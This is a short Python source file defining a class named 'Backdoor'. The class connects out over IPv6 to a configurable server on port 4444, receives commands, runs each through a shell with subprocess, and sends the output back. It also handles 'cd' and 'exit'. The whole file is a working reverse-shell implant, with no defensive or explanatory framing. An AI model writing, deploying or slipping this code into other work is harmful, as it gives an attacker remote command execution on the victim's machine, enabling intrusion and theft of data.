import socket
import subprocess
import os
import sys


class Backdoor:
    port = 4444

    def __init__(self, server_ipv6 = '0:0:0:0:0:0:0:0'):
        self.server_ipv6 = server_ipv6

    def main(self):
        backdoor = socket.socket(socket.AF_INET6, socket.SOCK_STREAM)
        backdoor.connect((self.server_ipv6, self.port, 0, 0))

        while True:
            command = backdoor.recv(1024)
            command = command.decode()

            self.check_command(command)

            op = subprocess.Popen(command, shell=True, stderr=subprocess.PIPE, stdout=subprocess.PIPE)

            output = op.stdout.read()
            output_error = op.stderr.read()
            if output == b'':
                output = b'Command finished \n'
            backdoor.send(output + output_error)

    def check_command(self, command):
        """Split the command to check for certain calls

        Args:
            command (str): The string command sent
        """
        try:
            cmd, params = str(command).split(" ")
        except:
            cmd = ''

        if cmd == "cd":
            os.chdir(params)
        elif str(command) == 'exit':
            sys.exit()